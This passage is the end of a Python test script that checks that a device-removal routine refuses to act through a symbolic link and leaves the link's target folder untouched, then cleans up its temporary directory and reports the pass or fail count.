    check("remove_device over it is refused", refused(lambda: g1.remove_device({"id": g2.settings["device"]["id"], "recovery_key": gh_key}), "link or not a folder")[0])
    check("nothing in the link's target was deleted or written", [p.name for p in victim2.iterdir()] == ["a.txt"])
finally:
    for path in ROOT.rglob("ORG.md"):
        try:
            os.chflags(path, 0)
        except OSError:
            pass
    shutil.rmtree(ROOT, ignore_errors=True)

print(f"\n{'all passed' if not fails else f'{fails} failed'}")
sys.exit(1 if fails else 0)
